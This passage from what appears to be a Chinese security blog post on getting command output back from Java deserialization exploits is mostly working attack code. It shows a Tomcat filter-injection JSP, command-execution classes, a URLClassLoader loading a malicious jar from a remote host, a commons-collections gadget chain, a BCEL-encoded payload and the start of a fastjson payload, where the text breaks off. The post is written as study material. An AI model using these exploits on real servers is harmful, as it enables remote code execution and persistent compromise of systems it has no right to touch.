             <span class="keyword">int</span> index = <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; filterMaps.length; i++) &#123;</span><br><span class="line">                            Object o = filterMaps[i];</span><br><span class="line">                            m = ccc.getMethod(<span class="string">"getFilterName"</span>);</span><br><span class="line">                            String name = (String) m.invoke(o);</span><br><span class="line">                            <span class="keyword">if</span> (name.equalsIgnoreCase(filterName)) &#123;</span><br><span class="line">                                tmpFilterMaps[<span class="number">0</span>] = o;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                tmpFilterMaps[index++] = filterMaps[i];</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; filterMaps.length; i++) &#123;</span><br><span class="line">                            filterMaps[i] = tmpFilterMaps[i];</span><br><span class="line">                        &#125;</span><br><span class="line">                        out.println(<span class="string">"Filter has been Inject,please visit /xxxxxxx/xx?sectest666=whoami"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">JAVA反序列化回显学习</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-12-17 15:59:04" itemprop="dateCreated datePublished" datetime="2020-12-17T15:59:04+08:00">2020-12-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-12-24 09:59:05" itemprop="dateModified" datetime="2020-12-24T09:59:05+08:00">2020-12-24</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index">
                    <span itemprop="name">代码审计</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">近年来出现的很多JAVA的漏洞都是无回显的漏洞，因此了解如何能让本身不回显的漏洞回显成为很多大佬研究的内容，本文将带着大家一起学习JAVA反序列化漏洞的回显方案。</span><br></pre></td></tr></table></figure>

<h3 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h3><p>​        defineClass可以将byte[]转换为Class类，如下所示defineClass会接收我们传入的name,byte[],长度等参数，最终会返回给我们一个Class类的对象。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201217174607641.png" alt="image-20201217174607641"></p>
<p>​        也就是说我们不仅可以通过ClassLoader.loadClass（）来获取Class类，也可以将一个类转化为byte[],通过defineClass我们就可以获取到这个类。</p>
<p>​        我这里写了个测试代码来帮助理解，首先我们创建一个test666类，内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.nio.charset.Charset;</span><br><span class="line"></span><br><span class="line">public class test666 &#123;</span><br><span class="line">    public test666(String cmd) throws Exception &#123;</span><br><span class="line">        InputStream stream &#x3D; (new ProcessBuilder(new String[]&#123;&quot;cmd.exe&quot;, &quot;&#x2F;c&quot;, cmd&#125;)).start().getInputStream();</span><br><span class="line">        InputStreamReader reader &#x3D; new InputStreamReader(stream, Charset.forName(&quot;gbk&quot;));</span><br><span class="line">        BufferedReader bufferedReader &#x3D; new BufferedReader(reader);</span><br><span class="line">        StringBuffer buffer &#x3D; new StringBuffer();</span><br><span class="line">        String line &#x3D; null;</span><br><span class="line"></span><br><span class="line">        while((line &#x3D; bufferedReader.readLine()) !&#x3D; null) &#123;</span><br><span class="line">            buffer.append(line).append(&quot;\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        throw new Exception(buffer.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        可以看到在我们的有参构造方法中，接收了cmd参数放到ProcessBuilder中执行将执行的结果通过exception异常来回显出来，我们将test666这个类编译，再编写一个类去将test666.class中的内容读取并存入到字节数组中，通过defineClass来获取test666这个类的Class对象，再通过newInstance来调用它的构造方法并传入参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line">public class defineClassTest extends  ClassLoader&#123;</span><br><span class="line">    public static &lt;defineClass&gt; void main(String[] args) throws IOException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException &#123;</span><br><span class="line">        File file&#x3D;new File(&quot;C:\\Users\\admin\\Desktop\\test666.class&quot;);</span><br><span class="line">        BufferedInputStream bis &#x3D; null;</span><br><span class="line">        ByteArrayOutputStream baos &#x3D; new ByteArrayOutputStream();</span><br><span class="line">        FileInputStream in &#x3D;new FileInputStream(file);</span><br><span class="line">        bis &#x3D; new BufferedInputStream(in);</span><br><span class="line">        byte[] buf &#x3D; new byte[1024];</span><br><span class="line">        int len &#x3D; 0;</span><br><span class="line">        while ((len &#x3D; in.read(buf)) !&#x3D; -1) &#123;</span><br><span class="line">            baos.write(buf, 0, len);</span><br><span class="line">        &#125;</span><br><span class="line">        byte[] buffer &#x3D; baos.toByteArray();</span><br><span class="line">        defineClassTest defineclasstest &#x3D; new defineClassTest();</span><br><span class="line">        Class cls &#x3D; defineclasstest.defineClass(&quot;test666&quot;,buffer,0,buffer.length);</span><br><span class="line">        cls.getConstructor(String.class).newInstance(&quot;ipconfig&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        执行结果如下，可以看到我们已经将命令执行的结果打印出了。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201217200921594.png" alt="image-20201217200921594"></p>
<h3 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h3><p>​        我们也可以使用URLClassLoader来加载远程的恶意类执行命令并获取回显,首先将我们生成的恶意类打包并放置到远程服务器上。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218101624866.png" alt="image-20201218101624866"></p>
<p>​        编写如下代码通过URLClassLoader加载远程的jar包执行命令并获取回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line">import java.net.MalformedURLException;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line">public class urlget &#123;</span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            URLClassLoader loader&#x3D;new URLClassLoader(new URL[]&#123;new URL(&quot;http:&#x2F;&#x2F;xxx:88&#x2F;test666.jar&quot;)&#125;);</span><br><span class="line">            Class cls &#x3D; loader.loadClass(&quot;test666&quot;);</span><br><span class="line">            cls.getConstructor(String.class).newInstance(&quot;ipconfig&quot;);</span><br><span class="line">        &#125; catch (MalformedURLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218103236476.png" alt="image-20201218103236476"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218103258089.png" alt="image-20201218103258089"></p>
<p>​        URLClassLoader回显方案在commons-collections利用链下的利用方式如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class commonsTest &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers &#x3D; new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(java.net.URLClassLoader.class),</span><br><span class="line"></span><br><span class="line">                new InvokerTransformer(&quot;getConstructor&quot;,</span><br><span class="line">                        new Class[] &#123; Class[].class &#125;,</span><br><span class="line">                        new Object[] &#123; new Class[] &#123; java.net.URL[].class &#125; &#125;),</span><br><span class="line"></span><br><span class="line">                new InvokerTransformer(</span><br><span class="line">                        &quot;newInstance&quot;,</span><br><span class="line">                        new Class[] &#123; Object[].class &#125;,</span><br><span class="line">                        new Object[] &#123; new Object[] &#123; new java.net.URL[] &#123; new java.net.URL(</span><br><span class="line">                                &quot;http:&#x2F;&#x2F;xxxxx:88&#x2F;test666.jar&quot;) &#125; &#125; &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;loadClass&quot;,</span><br><span class="line">                        new Class[] &#123; String.class &#125;, new Object[] &#123; &quot;test666&quot; &#125;),</span><br><span class="line"></span><br><span class="line">                new InvokerTransformer(&quot;getConstructor&quot;,</span><br><span class="line">                        new Class[] &#123; Class[].class &#125;,</span><br><span class="line">                        new Object[] &#123; new Class[] &#123; String.class &#125; &#125;),</span><br><span class="line"></span><br><span class="line">                new InvokerTransformer(&quot;newInstance&quot;,</span><br><span class="line">                        new Class[] &#123; Object[].class &#125;,</span><br><span class="line">                        new Object[] &#123; new String[] &#123; &quot;ipconfig&quot; &#125; &#125;),</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;将transformers数组存入ChaniedTransformer这个继承类</span><br><span class="line">        Transformer transformerChain &#x3D; new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;创建Map并绑定transformerChain</span><br><span class="line">        Map innerMap &#x3D; new HashMap();</span><br><span class="line">        innerMap.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">        Map outerMap &#x3D; TransformedMap.decorate(innerMap, null, transformerChain);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;触发漏洞</span><br><span class="line">        Map.Entry onlyElement &#x3D; (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        onlyElement.setValue(&quot;foobar&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218105916926.png" alt="image-20201218105916926"></p>
<h3 id="fastjson回显"><a href="#fastjson回显" class="headerlink" title="fastjson回显"></a>fastjson回显</h3><p>​        在fastjson的回显利用方案中，需要将我们的恶意类经过BCEL编码后传入，经过查阅资料fastjson回显的利用方案最终是因为调用了forName方法，而forName在调用的过程中会去执行static静态代码块，所以我们需要将我们的利用代码写在静态代码块中,由于在静态代码块中调用了方法，所以被调用的方法也要用static来修饰。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.nio.charset.Charset;</span><br><span class="line"></span><br><span class="line">public class test888 &#123;</span><br><span class="line">    static&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            exec(&quot;ipconfig&quot;);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void exec(String cmd) throws Exception &#123;</span><br><span class="line">        InputStream stream &#x3D; (new ProcessBuilder(new String[]&#123;&quot;cmd.exe&quot;, &quot;&#x2F;c&quot;, cmd&#125;)).start().getInputStream();</span><br><span class="line">        InputStreamReader reader&#x3D;new InputStreamReader(stream, Charset.forName(&quot;gbk&quot;));</span><br><span class="line">        BufferedReader bufferedReader &#x3D;new BufferedReader(reader);</span><br><span class="line">        StringBuffer buffer&#x3D;new StringBuffer();</span><br><span class="line">        String line&#x3D;null;</span><br><span class="line">        while((line&#x3D;bufferedReader.readLine())!&#x3D;null)&#123;</span><br><span class="line">            buffer.append(line).append(&quot;\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        throw  new Exception(buffer.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        编译上面的代码，我们可以获取到test888.class这个类，下面我们将这个类进行处理，转换为BCEL编码，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Path;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line">public class BCELencode &#123;</span><br><span class="line">    public static void main(String []args) throws Exception&#123;</span><br><span class="line">        Path path &#x3D; Paths.get(&quot;C:\\Users\\admin\\xxx\\test888.class&quot;);   &#x2F;&#x2F;文件绝对路径</span><br><span class="line">        byte[] data &#x3D; Files.readAllBytes(path);</span><br><span class="line">        String s &#x3D;  Utility.encode(data,true);</span><br><span class="line">        System.out.print(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218115406847.png" alt="image-20201218115406847"></p>
<p>​        我们可以编写如下代码测试能否利用<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code> 加载我们的恶意类执行命令,测试代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public class pwn &#123;</span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException &#123;</span><br><span class="line">        String classname&#x3D;&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuU$5dw$d3F$Q$bdk$cb$5eY$uqb$e7$D$93$94RJ$c1$J$c1$a6$40I$9a$844$q$85$f2$a1$E$g$a7$a1$wM$8b$y$af$j$r$8e$e4$p$cb$3d$fc$p$9ey$b19$f5$a1$7d$ebC$ffI$ffDaVv$9c$bav$fc$b0$ab$99$bd3$9e$7bgV$fa$fb$df$df$ff$Ap$HG$gfp$8fc$8d$e3$h$V$eb$w$eek$88$60C$$$9b$g$be$c5$D$8e$87$w$be$d3$f0$I$8f5$q$f0$84$e3$a9$86$R$Y$i$5b$g$92$b8$t$8dm$f9$f4L$c5s$8e$ef$e5$e3$8e$86$J$UT$ecj$b8$80$l$a4$b1$c7$f1$82$e3G$86$f8$aa$e3$3a$c1$gC4$3b$b7$c7$a0lz$r$c1$904$iWl7$8e$8b$c2$df$b5$8aU$f2$a4$M$cf$b6$aa$7b$96$efH$bb$ebT$82$D$a7$ce$900$CQ$P$96$96$96V$c8$r$5e$L$9ba2k$iZ$bfY$f9$aa$e5V$f2$85$c0w$dc$ca$8a$cc$l$b5$8fK2$d9$c0$nUR$P$7ca$jSl$e7$d4$f1$f2$8f$ddZ$p$u$84n$J$a0$bd$q$7c$86$99a$80$9d$f0$90$60$a3$c5F$b9$y$7cQ$da$e9$c2$cf$f7$e0$h$7d$t2e$H$db$c3$fc$a7$a2$OV2$aa$92$W$M$p$85$c0$b2$8f$b6$acZ$c8$9d$ba$c3aR$_H$7eR$9eA$7b$f0$da$W$b5$c0$f1$5c$SD$5d$b5$ab$5dY$99$e8$R$K$93$f7$60$x$d4$h$K$xx$N$df$W$P$j$v$a7$de$951$t$e1$3af$f1$J$Vv$g$fa$dc$f7lQ$afo4$9cj$c8k$ec$ff$r3p$927G$j$60$88$e4m$99$e1$t$j$_$f13$c7$be$8e_$f0$xC$e6L$e5$a87$95$e2$R$c7$x$j$W$8a2$96$da85$5c9yZ$3a9$j$d0L$87$40YG$F$HD_cH$Pa$af$c3$91$98Y$5c$n$b5$9c$9a$ed$b9e$a7$a2$e3s$5c$d1q$uy$f3$ae$W$7d4$9f$V$P$85$j$9cd$ecgA$e5d_$O$l$baX$3d$b0$fc$40$O$e5$9c1$m$tux$7c$c0IST$RA_$f6$e9$93$e0$81$b9$ec$b4$c8$r$bf$7d$60$f9u$R$e47$3b$3b$b1$u$7b$fe$b6uL$fd$c8$N$bb$Q$c6Y$91$94$f5Vv$e8$df$9d$j$o$99$a6O$83$ba3$$$bd$aa$bc8F8$c5$T$7d$S$9c$de$3d$abV$T$$$b5t$e1$ec2$87$dd$N5$f0NF$_Y$a3$3d$I$_$c9$aeo$d9$C$9f$d1$bbf$G$f2$X$F$93$c3L$ebE$b2$f2$b43$dac$f3$z$b0$b7$f4$Q$c1$a7$b4$c6Cg$i$97h$d5$3b$AJq$99$f6$84$i$LBQ0S$I$R$t$dfa$h$R3$fe$kQ3$9aR$K$a6$92$8a$V$cc$d8$7c$a1$85x$T$bc$J$d5h$pa$5eOi$efp$ae$F$7d$ab$8d$Rs$a1$85$d1$ed6$92f$Lc$cb$K$5b$8e$ddhb$dc$5c$8e$fd$85tF$c9$c4$9aH$a5$d2$b4$bcx$f3$e1$9f6$s$cc$8c$d2$c4d$LS$7f$86$Ed$85$97$a1$d2$9a$a4$K$c7$90$c38$W$91$c2$3a$d2$d8$a4$f7$e9$W$s$b1$8f$e9$b0$fa$b5N$85$f8$CWi$bf$84$t$b8$86$y1$caa$Vs$98$t$s$8b$b8$8d$ebX$a0$bc$ebd$df$a0$T$85$b2$5c$pi$ae$S$eb$9b$U5$8b$c8$Hr$c59$be$e4$b8$c5q$9b$e3$O$c7Wd$C$Z$dc$r$84B$Z$t$a8$a2$c5$9e$b0$fb$5daGS$d3$efp$fe$N$d4$a7$f3Md$dev$b5T$J$dd$e11E$96T5F$3a$ab$90$l$91s$f4$cd$Y$e9$v$9f$a0$dcK$f8$9a$yY$JG$e4$R$c7$b2$fc$bb$95$b0Y$ab$l$B$e8$60$97$T$ac$G$A$Ad&quot;;</span><br><span class="line">        ClassLoader cls&#x3D;new com.sun.org.apache.bcel.internal.util.ClassLoader();</span><br><span class="line">        Class.forName(classname,true,cls);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218134951663.png" alt="image-20201218134951663"></p>
<p>​        简单分析一下com.sun.org.apache.bcel.internal.util.ClassLoader的forName方法是如何执行的。</p>
<p>​        跟进forName方法，首先获取SecurityManager实例，获取实例为空后会调用forName0这个方法。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218140341587.png" alt="image-20201218140341587"></p>
<p>​        但是forName0是native层的代码，所以获取不到具体的执行细节。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218140555599.png" alt="image-20201218140555599"></p>
<p>​        但继续跟进会调用java.lang.ClassLoader.loadClass方法</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218140645454.png" alt="image-20201218140645454"></p>
<p>​        继续跟进调用，首先尝试通过class_name获取Class实例，这里没有获取到</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218140742726.png" alt="image-20201218140742726"></p>
<p>​        当没有获取到Class实例，会查看class_name中是否包含<code>$$BCEL$$</code>,如果包含会执行createClass方法。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218140906671.png" alt="image-20201218140906671"></p>
<p>​        在createClass中会以<code>$$BCEL$$</code>进行分割，取出real_name，将real_name中的内容解码成bytes形式，并获取ClassParser解析器，解析出test888这个类。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218141015072.png" alt="image-20201218141015072"></p>
<p>​        获取Class后通过defineClass来加载类，执行类中的static方法。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218141528766.png" alt="image-20201218141528766"></p>
<p>​            使用<code>org.apache.tomcat.dbcp.dbcp.BasicDataSource</code>配合回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,</span><br><span class="line">        &quot;c&quot;: &#123;</span><br><span class="line">                &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,</span><br><span class="line">                &quot;driverClassLoader&quot;: &#123;</span><br><span class="line">                    &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;driverClassName&quot;: 